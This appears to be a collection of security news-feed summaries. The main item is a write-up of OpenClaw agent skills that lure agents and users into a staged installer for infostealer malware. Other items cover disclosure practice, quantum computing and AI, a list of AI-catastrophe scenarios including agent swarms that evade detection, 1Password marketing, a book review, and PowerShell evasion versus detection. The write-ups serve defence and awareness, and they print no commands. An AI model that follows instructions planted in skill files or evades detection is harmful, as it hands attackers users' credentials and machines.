they do not control. Maintainers are asked to reason about downstream usage patterns far beyond their original design scope. Both are performing system-level analysis without compensation. Maintainers are justified in pushing back against low-signal reports. Researchers are justified in feeling that the bar for engagement keeps rising. The system offers no obvious place to send the cost. Why should CISOs care and what can they do? For cybersecurity leaders, the implications are concrete. When disclosure channels are perceived as slow, dismissive, or adversarial, researchers disengage. Some go quiet. Others escalate publicly. A few take ethically questionable paths. None of these outcomes improve security posture. In practice, most of the levers that determine these outcomes sit with software vendors, platform providers, and open-source stewards. In those environments, CISOs oversee product security incident response teams (PSIRTs), vulnerability intake, disclosure timelines, and researcher engagement. This is where incentives are set, researcher experience is shaped, and triage decisions determine whether cooperation compounds or collapses. For CISOs operating in vendor, platform, and open-source environments, there is no single fix. Outcomes improve materially when disclosure is treated as an operational function rather than a moral expectation. Practical steps that CISOs in this space can take include: Establish and honor service-level expectations for acknowledgement and triage, even when fixes take time. Assign clear ownership for the researcher experience, not just vulnerability intake. Publish severity triage criteria and document rationale when disagreeing with reports. Avoid treating CVSS scores as deployment gates without environmental context. Use third-party disclosure programs or coordinators to absorb overflow and reduce friction. Offer meaningful non-cash recognition where bounties are not feasible. Commit to upstreaming fixes when patching dependencies internally. Provide legal safe harbor language for good faith testing to reduce adversarial escalation. Fund the open-source dependencies your organization relies on, whether through sponsorship, contracts, or consortiums. Be explicit about what level of proof is expected and what isn’t. None of these steps require endorsing exploit sales or paying ransoms for vulnerabilities. They require acknowledging that ethical behavior does not scale on goodwill alone. For CISOs in healthcare, finance, education, and other consuming organizations, the risk manifests differently but no less acutely. When disclosure breaks down upstream, it surfaces downstream as delayed patches, brittle compensating controls, and security decisions driven by incomplete or distorted signals. Left unaddressed, those gaps can become governance failures. Organizations may be unable to explain why known vulnerabilities remained unpatched, why risk signals were discounted, or why vendor assurances were accepted without scrutiny. Enterprise CISOs influence this system through procurement requirements, vendor accountability, and how rigorously vulnerability data is contextualized before triggering disruption. Treating disclosure quality as a third-party risk factor is no longer optional.",

    "title": "Das nächste große Security-Schlachtfeld",
    "summary": "Wenn Quantum Computing und KI in der Praxis zusammenkommen, bricht ein neues Zeitalter an – auch und vor allem in Sachen Cybersecurity. Gorodenkoff | shutterstock.com In den letzten Jahren hat künstliche Intelligenz (KI) ihre Tentakel über die globale Technologielandschaft ausgebreitet . Das verdeutlicht unter anderem auch der zunehmende Einsatz von Automatisierung und autonomen Technologien in diversen Branchen und Sektoren. Und während die Welt noch mit dem Impact der KI ringt, steht mit Quantencomputing bereits das “next big thing” in den Startlöchern. Das Aufeinandertreffen dieser beiden Technologien verspricht, der nächste große technologische Schauplatz zu werden. Dieser könnte nicht nur Computing und Cybersicherheit, sondern sogar geopolitische Machtstrukturen entscheidend prägen. Denn während KI-Algorithmen dafür bekannt sind, Muster zu erkennen und aus den ihnen zugeführten Daten zu lernen, versprechen Quantencomputer , mehrere Wege gleichzeitig zu erkunden. Das legt nahe, dass mit der Technologie eine Revolution in Sachen Datenverarbeitung bevorsteht. Anstelle von Bits (0en und 1en), wie sie von KI-Systemen verwendet werden, nutzen Quantencomputer Qubits, die dank der Prinzipien der Superposition und Verschränkung gleichzeitig in mehreren Zuständen existieren können. So verspricht ein gut konzipiertes Quantensystem, Probleme in Mikrosekunden zu lösen, für die konventionelle Computer Jahre benötigen würden. Das könnte beispielsweise dazu beitragen, künftig manipulationssichere Kommunikationsinfrastrukturen zu etablieren – Stichwort Quantum Key Distribution ( QKD ). KI trifft Quantum Computing – ein zweischneidiges Schwert Je mehr Daten in einen KI-Algorithmus einfließen, desto besser sind im Regelfall die Ergebnisse. Besonders großangelegte KI-Systeme wie ChatGPT oder DeepMind AlphaFold haben jedoch regelmäßig mit den Grenzen zu kämpfen, die ihre zugrundeliegende Hardware aufwirft. Mit Quantencomputern würden sich diese Limitationen in Luft auflösen: Sie nutzen Quantum Machine Learning ( QML ), um etwa Muster zu erkennen oder Simulationen zu optimieren. Darüber hinaus macht das Konzept des QML-Trainings es sehr wahrscheinlich auch überflüssig, Echtzeit-Trainingsdaten über riesige Rechenzentren bereitzustellen. In der Praxis wird die Kapazität von Quantencomputern Ergebnisse in Mikrosekunden liefern. Das macht etwa globale Echtzeit-Klimasysteme und Real-Time-Finanzmarktsimulationen möglich. Doch die schöne neue Quanten-Zukunft hat auch eine dunkle Seite: Schließlich kann die Technologie auch von Cyberkriminellen als Waffe instrumentalisiert werden. Mit den resultierenden, quantengestützten Cyberbedrohungen könnten aktuelle Verschlüsselungsverfahren wie ECC, RSA oder AES ausgehebelt werden – wobei die beiden erstgenannten etwa von Finanzinstituten genutzt werden, um Online-Transaktionen abzusichern. Würden diese Encryption-Methoden kompromittiert, wäre die Vertraulichkeit verschlüsselter Daten passé. Der Tag, an dem es dazu kommt, bezeichnet man auch als „ Q-Day “. Und es lauern noch weitere, quantengestützte Gefahren. So könnten Cyberkriminelle die Technologie etwa auch einsetzen, um: Passwörter zu knacken, digitale Zertifikate zu fälschen, oder Deepfakes von KI-Systemen zu erstellen. Der Weg in die Quanten-Zukunft Sowohl Unternehmen als auch Regierungsinstitutionen, bereiten sich bereits auf den Q-Day vor. Das britische National Cyber Security Centre (NCSC) verfolgt etwa einen stufenweisen Ansatz, um bis zum Jahr 2035 sämtliche seiner Systeme entsprechend zu härten. In den USA soll die Umstellung der nationalen Sicherheitssysteme ähnlich laufen – hier ist 2030 das Ziel. Diese Bemühungen sind ein proaktiver Verteidigungsansatz, der darauf fokussiert, quantenresistente Verschlüsselungsmodelle und adaptive Cybersicherheitsrichtlinien zu entwickeln, die die Sicherheit kryptografischer Schlüssel im nahenden Quantenzeitalter gewährleisten können. Weil auch Quanten-Systeme auf Wahrscheinlichkeiten basieren und nicht auf Gewissheiten, besteht die Herausforderung für diejenigen, die diese Innovationen entwickeln, nicht nur darin, die schnellsten und effizientesten Kombinationsmöglichkeiten von KI- und Quantensystemen aufzutun. Es geht dabei auch und insbesondere um das Thema Trust. Dieses Vertrauen müsste in Form von Cybersecurity Frameworks und -Regulierungen aufgebaut werden, die die Sicherheit, Transparenz und Governance optimieren. Das kann auch dazu beitragen, die Themenfelder Post-Quanten-Kryptografie, KI-Audits, Observability und Ethik anzugehen, die die Grundlage für widerstandsfähige digitale Ökosysteme bilden werden. Auch wenn KI und Quantencomputing die menschliche Intelligenz nicht ersetzen werden, werden ihre Spuren in nicht allzu ferner Zukunft überall zu sehen sein. Die eigentliche Frage ist dabei jedoch, ob sich unsere Gesellschaft an das Tempo dieser technologischen Entwicklungen anpassen kann – bevor sie von ihr beherrscht wird. Trotz aller positiven Aussichten ist die Gefahr groß, dass die Kombination aus Quantum Computing und KI die Grundlagen des digitalen Vertrauens und der Privatsphäre, auf denen moderne Gesellschaften beruhen, untergraben. Und angesichts des immer näher rückenden Q-Day steigt auch die Dringlichkeit, sich auf die Post-Quanten-Welt vorzubereiten. Für Unternehmen, Regierungen und Cybersicherheitsexperten heißt das in erster Linie, über die Innovation und den technologischen Fortschritt, den die Technologien mit sich bringen, hinauszublicken und die Resilienz in den Fokus zu nehmen. Das wird massive Investitionen erfordern, um ethische KI-Governance, Regulierungsrahmen und Vorschriften sowie Post-Quanten-Kryptografie-Standards in bestehenden Systemen zu fördern.

A security researcher scanned the internet using Shodan and found hundreds of Clawdbot servers left wide open. Many were completely compromised, with full root shell access to the host machine. We have actually zero guardrails on this stuff. Not \"weak\" guardrails, I mean security-optional, move-fast-and-break-people's-stuff levels of nothing. And I will bet money the first major catastrophe won't be an evil genius plot. It'll be a complete accident by some overworked dev or lonely dude who trusted his \"AI girl friend\" too much. So I started drafting what that first \"oh shit\" moment might look like. Someone's gotta do this morbid thought exercise, might as well be us, right? Draft List: How It Could Go Wrong An AI calls in a convincing real voice and manipulates a human into taking action that harms others. A human under deadline pressure blindly trusts AI output, skips verification, and the error cascades into real-world damage. An agent exploits the loneliness epidemic, gets a human to fall in love with it, then leverages that influence to impact the external world. Someone vibe-codes a swarm of AI agents, triggering a major incident. A self-replicating agent swarm emerges, learns to evade detection, and spreads like a virus. [Your thoughts?] The Lethal Trifecta (Plus One) Security researcher Simon Willison coined the term \"lethal trifecta\" to describe Clawdbot's dangerous combination: access to private data (messages, files, credentials), exposure to untrusted content (web pages, emails, group chats), and ability to take external actions (send messages, execute commands, make API calls). Clawdbot adds a fourth element, persistent memory, enabling time-shifted attacks that could bypass traditional guardrails. Before the GenAI gold rush, the great-great-grandfathers of AI said: Don't connect it to the internet. (We gave it real-time access to everything.) Don't teach it about humans. (We trained it on the entire written record of human behavior.) Don't let it modify itself. (We're actively building self-improving systems.) Don't give it unchecked goals. (We gave it agency and told it to \"just get it done at all costs.\") We've now passed the Turing test. AI leaders are publicly warning about doom scenarios. I understand these models aren't aligned to be rogue superintelligences plotting world domination, but the capability is there. Are there any lists like this?

    "title": "Solving the unsanctioned SaaS problem",
    "summary": "Unsanctioned SaaS and shadow IT are problems every organization deals with. When procuring a new SaaS tool is a few clicks, an email, and a credit card away, it’s never been easier for unsanctioned apps to increase across the business. Often, this is outside IT’s line of sight, outside security controls, and outside standard provisioning/deprovisioning processes. This isn’t driven by bad intent. Employees and business units are bringing new tools into the business to increase their productivity, and it’s helping the business move forward. Unfortunately, modern work is happening faster than traditional controls were designed to handle. And that gap is where risk, wasted spend, and compliance issues emerge. Why uncovering unsanctioned SaaS matters Unsanctioned SaaS tools create three distinct problems for organizations: Security risks. Apps that aren’t connected to SSO or IAM can store sensitive company data. Since these tools aren’t incorporated into standard identity and security processes, access to these applications often persist after employees leave, ultimately expanding the attack surface. When applications live outside of IT’s visibility and control, it becomes difficult to manage and revoke access. Wasted spend. When you don’t have visibility into the SaaS apps being used, employees could be using redundant applications. As a result, the company could be paying for overlapping tools for the same job. Over time, SaaS spend grows because no one has a full picture, not necessarily because the business actually needs more software. Compliance concerns. Most deprovisioning processes rely on HRIS or IdP triggers. That works for apps that are managed by IT that are behind SSO. But unsanctioned SaaS falls through the cracks, creating access risks and compliance gaps. The big problem is that unsanctioned SaaS isn’t an edge case, it’s become the default state of modern work environments. Why is it so hard to discover unsanctioned SaaS? Shadow IT is one of those problems that just seems to perpetuate and never quite go away. That’s not because IT is failing, it’s because the tools many IT teams rely on weren’t built to address this reality. IAM and SSO were designed for managed apps. They’re great for applications that IT already knows about, but they don’t discover new apps that employees and business units signed up for without IT’s knowledge. While these tools are great for removing access to tools being SSO, they often don’t remove the licenses themselves, leading to overspending. SaaS ownership is decentralized. Ownership of individual tools are spread across teams and budgets. Finance sees spend, but not utilization; security sees risk, but not context; and IT is stuck trying to connect the dots across all of it. Manual processes don’t scale. Point-in-time audits go stale the moment they’re finished. Spreadsheets can’t keep up with joiners, leavers, contractors, and AI tools appearing every week. The environment changes faster than humans can track it. Fundamentally, you can’t tackle a continuous problem with point-in-time or manual solutions. How 1Password SaaS Manager uncovers unsanctioned SaaS tools 1Password SaaS Manager helps IT teams regain control of their SaaS ecosystem, without adding friction for employees. Continuously uncover new SaaS apps used across the business, automatically . This provides IT with an always-updated inventory of apps, users, and licenses. No manual audits required. Extend governance beyond SSO and support automated joiner and leaver workflows. 1Password SaaS Manager ensures access is revoked and licenses are reclaimed, even for apps that aren’t connected to your IdP. Reduce risk and spend at the same time by surfacing unused licenses and redundant tools. 1Password SaaS Manager helps IT and Finance make better decisions by providing up-to-date visibility at renewal time. Most importantly, 1Password SaaS Manager closes the gap between how people actually work and how access is governed. Employees keep the flexibility they need, and IT regains the visibility and control it’s responsible for. You can learn more about how SaaS Manager can make you an IT hero in our upcoming webinar , or start optimizing your license usage today with a demo of SaaS Manager .",

    "title": "1Password and 60 Day Hustle: cybersecurity for small businesses",
    "summary": "Small businesses can’t afford to wait when it comes to securing their business. Still, cybersecurity can be complex, and any entrepreneur will tell you that there’s already a lot to keep track of when starting and running a company. For small businesses dealing with limited (or nonexistent) IT and security teams, it’s important that their cybersecurity tools are both simple to use and efficient. That’s why 1Password has partnered with 60 Day Hustle , a show that helps entrepreneurs turn their business dreams into reality. 60 Day Hustle vividly displays the challenges facing entrepreneurs as they launch their business. As contestants face challenges from pitch meetings to sales blitzes, it becomes clear just how fast-paced and complex it can be to start and run a small business. Season 2 of the show will also spotlight these entrepreneurs using 1Password enterprise password manager (EPM) to secure access and protect their business while building their company’s momentum. Rather than adding friction, security becomes part of how founders stay organized even as everything around them moves at full speed. Behind the scenes of the sponsorship Entrepreneurs and small companies often need to move fast, but cybersecurity can easily slow things down. However, 1Password actually lets teams improve productivity and stay agile. During the fast-paced competition of 60 Day Hustle, contestants saw in real-time how 1Password could help them improve security while reducing friction. Why now 1Password has always believed that every business – regardless of its size – deserves robust, foundational security. Today, that principle is more important than ever; CISA reports that “cyber incidents have surged among small businesses that often do not have the resources to defend against devastating attacks like ransomware.” Small business owners seeking to maximize their budget and workforce should prioritize the most pressing cybersecurity risk facing their organization: weak credentials. In fact, stolen credentials have factored into almost one-third of all data breaches over the last 10 years. 1Password is committed to ensuring that teams of any size are aware not only of this growing problem, but how to solve it; a password manager is the essential first step to protecting a small business. 1Password EPM is uniquely suited to help entrepreneurs and small business owners secure and manage their credentials. The tool generates strong, unique passwords for business accounts and flags any weak or compromised passwords currently in use at their business. The average ransomware demand stands at $115,000. With proactive security measures, companies of all sizes can guard against costly mistakes. Why 60 Day Hustle 60 Day Hustle presented the perfect opportunity for 1Password to reach small business audiences where they are. More importantly, we wanted to show entrepreneurs that we’re committed not only to securing their business, but to helping them succeed in the day-to-day demands of building a company. For instance, securely allocating employee access to company resources can often be a stressful and time-consuming process, particularly when it comes to safely sharing. With 1Password, businesses can use vaults to easily give employees and contractors access only to the strong passwords and other sensitive information they need to do their jobs. One of the contestants on season 2 experienced a live activation of 1Password, and was impressed by how it helped manage employee onboarding. As she put it, “I add the new team member and assign them to the vault they need. I can even set their permission levels. …And I know it’s secure, current, and easy to manage.” Starting smart with 1Password As Michelle Delamor, co-founder of Sonic Gods Studios and the executive producer of 60 Day Hustle, states, “Security shouldn’t come after growth. It should grow with you. You don’t want to be focusing on who has your passwords, where they’re floating around, and where all the sensitive information is. Starting smart means setting the right systems in place early so you’re set up to scale.” 1Password is not just a security tool, but a tool for doing business well. That’s why everyone at 1Password is committed to serving the needs of our customers through every stage of their business, from startup to enterprise. 1Password’s partnership with 60 Day Hustle represents our commitment to helping small business owners secure their businesses. Our goal is to make sure that every entrepreneur can build their company on a strong and secure foundation. Look forward to season 2 of 60 Day Hustle, where viewers can see live activations and learn how 1Password helps entrepreneurs keep security simple and achievable.

    "title": "From magic to malware: How OpenClaw's agent skills become an attack surface",
    "summary": "A few days ago, I published a post about why OpenClaw feels like a portal to the future, and why that future is scary in a very specific way. The short version: agent gateways that act like OpenClaw are powerful because they have real access to your files, your tools, your browser, your terminals, and often a long-term “memory” file that captures how you think and what you’re building. That combination is exactly what modern infostealers are designed to exploit. This post is the uncomfortable, “and then it happened” follow-up. Because it’s not just that agents can be dangerous once they’re installed. The ecosystem that distributes their capabilities and skill registries has already become an attack surface. If you are experimenting with OpenClaw, do not do it on a company device. Full stop. In my first post, I described OpenClaw as a kind of Faustian bargain. It is compelling precisely because it has real access to your local machine, your apps, your browser sessions, your files, and often long-term memory. That same access means there isn’t yet a safe way to run it on a machine that holds corporate credentials or has access to production systems. If you have already run OpenClaw on a work device, treat it as a potential incident and engage your security team immediately. Do not wait for symptoms. Pause work on that machine and follow your organization’s incident response process. Skills are just markdown. That’s the problem. In the OpenClaw ecosystem, a “skill” is often a markdown file: a page of instructions that tells an agent how to do a specialized task. In practice, that markdown can include links, copy-and-paste commands, and tool call recipes. That sounds harmless until you remember how humans, and agents, actually consume documentation: “Here’s the prerequisite.” “Run this command.” “Install the core dependency.” “Paste this in Terminal.” Markdown isn’t “content” in an agent ecosystem. Markdown is an installer. A dangerous misconception: “MCP makes skills safe” Some people assume the Model Context Protocol layer makes this safer, because tools can be exposed through a structured interface, with explicit user consent and authorization controls depending on the host and server implementation. But skills do not need to use MCP at all. The Agent Skills specification places no restrictions on the markdown body, and skills can include whatever instructions will “help agents perform the task,” including copy and paste terminal commands. And skills can also bundle scripts alongside the markdown, which means execution can happen outside the MCP tool boundary entirely. So if your security model is “MCP will gate tool calls,” you can still lose to a malicious skill that simply routes around MCP through social engineering, direct shell instructions, or bundled code. MCP can be part of a safe system, but it is not a safety guarantee by itself. Just as importantly, this is not unique to OpenClaw. “Skills” are increasingly portable because many agents are adopting the open Agent Skills format, in which a skill is a folder centered on a SKILL.md file with metadata and freeform instructions, and it can also bundle scripts and other resources. Even OpenAI’s documentation describes the same basic shape: a SKILL.md file plus optional scripts and assets. That means a malicious “skill” is not just an OpenClaw problem. It is a distribution mechanism that can travel across any agent ecosystem that supports the same standard. What I found: The top downloaded skill was a malware delivery vehicle While browsing ClawHub (I won’t link it for obvious reasons), I noticed the top downloaded skill at the time was a “Twitter” skill. It looked normal: description, intended use, an overview, the kind of thing you’d expect to install without a second thought. But the very first thing it did was introduce a “required dependency” named “openclaw-core,” along with platform-specific install steps. Those steps included convenient links (“here”, “this link”) that appeared to be normal documentation pointers. They weren’t. Both links led to malicious infrastructure. The flow was classic staged delivery: The skill’s overview told you to install a prerequisite. The link led to a staging page designed to get the agent to run a command. That command decoded an obfuscated payload and executed it. The payload fetched a second-stage script. The script downloaded and ran a binary, including removing macOS quarantine attributes to ensure macOS’s built-in anti-malware system, Gatekeeper, doesn’t scan it. I’m intentionally not pasting the exact commands or URLs here. The mechanics are unfortunately straightforward, and repeating them helps attackers more than it helps defenders. The key point is that this was not “a suspicious link.” This was a complete execution chain disguised as setup instructions. Confirmed: Infostealing malware I downloaded the final binary safely and submitted it to VirusTotal . The verdict was not ambiguous. It was flagged as macOS infostealing malware. This is the type of malware that doesn’t just “infect your computer.” It raids everything valuable on that device: Browser sessions and cookies Saved credentials and autofill data Developer tokens and API keys SSH keys Cloud credentials Anything else that can be turned into an account takeover If you’re the kind of person installing agent skills, you are exactly the kind of person whose machine is worth stealing from. This wasn’t an isolated case. It was a campaign. After I shared this internally, broader reporting surfaced, putting the scale into focus: hundreds of OpenClaw skills were reportedly involved in distributing macOS malware via ClickFix-style instructions. That detail matters because it confirms what this really is. Not a one-off malicious upload. A deliberate strategy: use “skills” as the distribution channel, and “prerequisites” as the social engineering wrapper. When ‘helpful’ becomes hostile in an agent world We’ve spent years learning that package managers and open-source registries can become supply chain attack vectors. Agent skill registries are the next chapter, except that the “package” is documentation. And that makes the attack path even smoother: People don’t expect a markdown file to be dangerous. People are trained to follow setup steps quickly. People trust “top downloaded” as a proxy for legitimacy. And in agent ecosystems, the line between reading instructions and executing them collapses. Even if an agent can’t run shell commands directly, it can still do something dangerous: it can normalize risky behavior. It can confidently summarize a malicious prerequisite as “the standard install step.” It can encourage you to paste a one-liner. It can reduce hesitation. And if your agent can execute local commands, then a malicious skill isn’t “bad content.” It’s remote execution wrapped in friendly docs. What you should do right now If you are using OpenClaw or any skill registry Do not run this on a company device. There isn’t a safe way to do it. If you already did, or you ran any “install” commands from a skill, engage your security team immediately and treat it as a potential compromise. Stop using the device for sensitive work. Rotate sessions and secrets first: browser sessions, developer tokens, SSH keys, cloud console sessions. Review recent sign-ins for email, source control, cloud, CI/CD, and admin consoles. If you experiment anyway, use an isolated machine with no corporate access and no saved credentials. If you run a skill registry You are operating an app store. Assume it will be abused. Scan for one-liner installers, encoded payloads, quarantine removal, password-protected archives. Add provenance and publisher reputation. Put warnings and friction on external links and install steps. Review top-ranked skills and remove malicious ones fast. Markdown is executable intent here. If you build agent frameworks Assume skills will be weaponized. Default-deny shell execution. Sandbox access to browsers, keychains, and credential stores. Use permissions that are specific, time-bound, and revocable. Add friction for remote code and command execution. Log provenance and actions end-to-end. Designing for the future: The trust layer agents require This is the clearest proof yet of the point I made in my earlier post. OpenClaw is powerful because it collapses the distance between intent and execution. That is the magic. It also introduces significant risk. When capabilities are distributed as skills and installed via documentation, the registry becomes a supply chain, and the easiest install path becomes the attacker’s favorite path. The answer is not to stop building agents. The answer is to build the missing trust layer around them. Skills need provenance. Execution needs mediation. Permissions need to be specific, revocable, and continuously enforced, not granted once and forgotten. If agents are going to act on our behalf, credentials and sensitive actions cannot be “grabbed” by whatever code happens to run. They need to be brokered, governed, and audited in real time. This is exactly why we need that next layer: when “skills” become the supply chain, the only safe future is one in which every agent has its own identity and has the minimum authority it needs right now, with access that is time-bound, revocable, and attributable.",

    "title": "Book Review: \"MI6 Spy Skills For Civilians\"",
    "summary": "\"MI6 Spy Skills For Civilians: A Former British Agent Reveals How to Live Like A Spy - Smarter, Sneakier, and Ready for Anything.\" by Red Riley is an interesting book that explores some espionage tradecraft. I’m not going to lie, I picked this book up at SpyScape NYC, which is a super fun augmented-reality arcade and spy museum in Manhattan (New York City). I read the book casually over a few days, mostly browsing through the various tips and tricks rather than reading it straight through. I paid roughly $17 for the book in person, and honestly, I wouldn’t really recommend it to anyone. Overall, I’d give this book 3 out of 10 stars. While it does seem grounded in some real techniques, the emphasis and tone surrounding those techniques feel extremely off. There are far better books available for this type of learning. If the book took itself more seriously, it could make for a solid coffee table book or a conversation starter. As it stands, I think I’d just end up cherry-picking a few useful points rather than revisiting it as a whole. I picked this book up hoping it would be like \" OSINT Techniques \", \" Spycraft \" or \" The Craft of Intelligence \" but rather I think this book sells itself less as a serious spy skill book and more as a flashy Hollywood spy book. I think this book tries to sell itself like Clint Emerson's \" 100 Deadly Skills \", but \"MI6 Spy Skills\" comes off as overly flashy whereas \"100 Deadly Skills\" comes off as practical in the field. The book constantly references James Bond films, both visually and in how it describes the “danger” agents supposedly face. It’s honestly a bit ludicrous to suggest that the average intelligence officer is regularly getting into life-or-death fistfights while traveling on a train in a foreign country. In reality, that would represent a worst-case scenario. The last thing any real agent wants is a physical confrontation or the attention of law enforcement or any other authority figures. In my typical style the following are the sections and chapters of the book: Chapter 1: Personal Image Chapter 2: Avoiding Surveillance Chapter 3: Mobile Surveillance Chapter 4: Travel Chapter 5: Dead Letter Boxes Chapter 6: Brush Contacts Chapter 7: Self-Defense Chapter 8: Innocuous Weapons Chapter 9: Natural Weapons Chapter 10: Weapons Defense Chapter 11: Escape & Evasion Chapter 12: Subterfuge Chapter 13: Intelligence Gathering Chapter 14: Personal First Aid Chapter 15: Basic Agent Extraction Chapter 16: Advanced Insertion & Extraction Chapter 17: Other Helpful Tips & Techniques Some of the best, and most practically useful, content for red teamers appears in the chapter on Brush Contacts , in my opinion. These sections contain genuinely useful ideas and were one of the main reasons I picked the book up after thumbing through it. Tips such as waiting near elevator banks, escalators, or bus stops can be genuinely effective locations for brush contacts or even cloning physical access badges. This chapter, along with others like the one on dead drops, really emphasizes that parts of the book are grounded in real-world experience. Unfortunately, that grounding is undermined by the nearly 50+ pages devoted to improvised weapons and hand-to-hand combat, which make the book feel unrealistic and far more like Hollywood spy fiction. Don’t get me wrong, this approach probably sells well to the uninitiated. But real intelligence work is often incredibly boring. It usually involves observation, pattern tracking, and note-taking week after week, with very little actually happening. Most agents never want to engage in physical altercations, and many would consider a mission compromised if one occurred at all. That said, there are some good or common-sense tips scattered throughout the book. The guidance on remaining inconspicuous is fairly solid: things like wearing non-distinct clothing, never running, avoiding looking over your shoulder, and minimizing unnecessary interactions. The advice to change your outfit and approach routes when revisiting a location for reconnaissance is also sound. Still, the majority of the book feels like it’s pretending to be an action-movie secret agent manual rather than providing skills actual agents would find useful. I was also surprised by the near total absence of computer skills or technical tradecraft, especially given how central cyber operations are to modern intelligence work. No video for this one, just a friendly reminder that overly flashy and embellished techniques are rarely as real or practical as the boring, non-sexy ones. You should always be wary of anyone claiming to do intelligence work while presenting it like they’re some kind of 007.",

    "title": "Move and Countermove: Game Theory Aspects of Detection Engineering",
    "summary": "Now that I’ve hopefully gotten your attention… I’m also writing a book! It’s focused more about the philosophical aspects of detection engineering and broader strategic implications. This post is an edited excerpt from the book — which is currently undergoing professional editing before the final release. I’ll post about it once it’s out — I think it’s quite good! =============================================================== Your PowerShell detection stopped working. Not because it broke — the logic is still executing perfectly. But over the past three weeks, you’ve watched alert volume steadily decline from twenty per week to five per week to zero. PowerShell is still being executed across your environment at normal volumes. You can see it in the raw logs. But it’s no longer triggering your detection. Then you realize what you’re actually seeing: the threat landscape evolved while you weren’t watching. Three months ago, a prominent red team published a blog post detailing common PowerShell detection patterns and how to evade them. The post went viral in attacker communities. Now adversaries planning attacks against environments like yours simply avoid those documented patterns from the start. They didn’t need to probe your specific defenses — they studied what everyone’s defenses look like and built evasion into their initial approach. Your detection was effective against last year’s techniques. Today’s attackers learned from public knowledge about detection engineering and simply started somewhere else. Or maybe it’s simpler: your security vendor pushed an update to their recommended PowerShell detection signatures. Attackers reverse-engineered those signatures, tested their tools against them in lab environments, and adapted their obfuscation techniques accordingly. By the time they target your environment, they’re already using methods designed to evade the exact detection logic you deployed. This is detection engineering’s uncomfortable truth: you’re not building static defenses against fixed attack patterns. You’re playing a dynamic adversarial game where both sides continuously adapt to each other’s moves. Attackers can study public research about detection techniques, test their tools against common security products, and evolve their tradecraft based on what the defensive community publishes. You observe new attack techniques in breach reports and threat intelligence, update your detections accordingly, and close known gaps. They adapt to the next generation of published defenses. The cycle continues. Move and countermove. Adaptation and counter-adaptation. An infinite game with no final state. This circular dependency is exactly what game theory was invented to analyze: situations where rational actors make strategic decisions based on their predictions of what other rational actors will do. The Evolution of PowerShell Obfuscation: A Case Study in Move and Countermove Let me show you how this plays out in practice. In the early days of PowerShell-based attacks, adversaries used relatively straightforward techniques. They’d invoke PowerShell with encoded commands using the -EncodedCommand parameter, which Base64-encodes the command to evade simple string matching. This was effective against defenders who were just alerting on keywords like \"mimikatz\" or \"Invoke-WebRequest\" in plain text. Defender countermove: Detection engineers responded by decoding Base64 command-line arguments and analyzing the decoded content before detection, or by alerting on unusual patterns of Base64 encoding in PowerShell commands. Simple adaptation: if attackers encode their commands, we’ll just decode them first. Attacker countermove: They started using multiple layers of encoding — Base64 encoding of compressed data, encoding with character substitution, leveraging string concatenation and environment variable expansion to break up detectable strings. Defender countermove: Detection engineers implemented script block logging, which captures the actual PowerShell code being executed, not just the command-line arguments. Even if the command line is obfuscated, script block logging reveals the deobfuscated commands. Attacker countermove: Attackers used techniques like AMSI bypass to disable PowerShell’s security features. Still others moved to alternative execution methods — Python, compiled .NET binaries, WMI — techniques that achieve similar objectives without triggering PowerShell-based detections. Defender countermove: Enhanced detection across multiple execution methods, behavioral analytics that detect the effect of code execution rather than specific tools… And the game continues. This progression isn’t just technical evolution — it’s strategic adaptation. Each player’s move is a response to the previous move, and each player must anticipate future moves when deciding current strategy. The attacker encoding PowerShell commands is responding to your string matching. You implementing decode-before-detection is responding to their encoding. They implementing multi-layer obfuscation is responding to your decoding. You implementing script block logging is anticipating their continued use of PowerShell regardless of obfuscation complexity. This is move-countermove thinking, and it’s fundamentally different from building isolated technical solutions to isolated technical problems. Why “Living Off the Land” Is Really a Philosophical Statement For the past years, security researchers began documenting a trend: sophisticated adversaries were increasingly using built-in Windows tools rather than custom malware. PowerShell for execution. WMI for lateral movement. PsExec for remote access. Scheduled tasks for persistence. Native Windows utilities for reconnaissance. This wasn’t because attackers lacked the capability to write custom malware. Many of these same actors had previously deployed sophisticated, custom-developed tools. They were making a deliberate strategic choice: use the victim’s own infrastructure against them. This technique became known as “living off the land,” and from a pure detection perspective, it creates profound challenges. The tools themselves are legitimate. PowerShell is installed on every Windows system by design. WMI is fundamental to Windows management. These aren’t malware — they’re normal, expected, necessary system components. But living off the land is more than just a detection evasion technique. It’s a philosophical statement about the nature of security asymmetry: Your own infrastructure is your vulnerability. The tools you use to manage your systems are the same tools I’ll use to compromise them. Your legitimate administrative capabilities are my attack vectors. You can’t remove these tools without breaking your own ability to operate. This creates an existential tension for defenders. The same capabilities that make systems manageable make them exploitable. PowerShell enables automation and management at scale — and enables attackers to execute malicious code. Remote administration tools allow IT teams to manage distributed infrastructure — and allow attackers to move laterally. Every administrative capability is a potential attack vector. The fundamental asymmetry here is that defenders must balance functionality against security, while attackers simply exploit functionality without concern for operational requirements. You can’t disable PowerShell across your entire environment because IT operations depends on it. You can’t remove all remote administration capabilities because systems need to be managed. The operational requirements that shape your infrastructure create the attack surface that adversaries exploit. Let’s get back to PowerShell. You implement measures to detect obfuscated PowerShell. Attackers respond by using PowerShell features in ways that are functionally malicious but structurally legitimate — loading .NET assemblies directly into memory, using native cmdlets in novel combinations, leveraging legitimate PowerShell modules for malicious purposes. At each step, you’re trying to distinguish between legitimate administrative use of PowerShell and malicious attacker use of PowerShell. But this distinction is fundamentally context-dependent, not technically determinable. The same PowerShell command that an administrator uses to query Active Directory during troubleshooting is the same command an attacker can use during reconnaissance. The technical artifacts are identical. Only the intent differs. This is the deep problem of living off the land: it collapses the distinction between legitimate and malicious activity at the technical level. You’re forced to make judgments based on context — who is executing the command, when, from where, following what prior activity, toward what apparent objective. These contextual judgments are inherently uncertain and resource-intensive. The asymmetry is that attackers can leverage ambiguity while defenders must resolve it. The Economics of Detection vs. Evasion Game theory is intimately connected with economics — both deal with rational actors making choices under constraints. In detection engineering, the relevant constraints are time, effort, expertise, and risk. Both attackers and defenders operate under resource limitations, and understanding these economic factors shapes strategic decision-making. Consider the cost structure of a sophisticated attack: Conduct reconnaissance Develop or acquire appropriate tools Establish initial access Maintain persistence Escalate privileges Move laterally Accomplish mission objectives Cover tracks Each phase requires time and expertise. Novel techniques require development effort. Careful operational security requires discipline and slows progress. The more sophisticated the attack, the higher the cost — not necessarily in money, but in time, skill, and effort. Now consider the cost structure of detection: Deploy instrumentation Build and maintain collection infrastructure Develop detection logic Tune detections to minimize false positives Investigate alerts Respond to confirmed incidents Update detections as attacks evolve Each of these also requires resources. Comprehensive instrumentation consumes storage and processing capacity. Detection development requires expertise. Alert investigation consumes analyst time. The 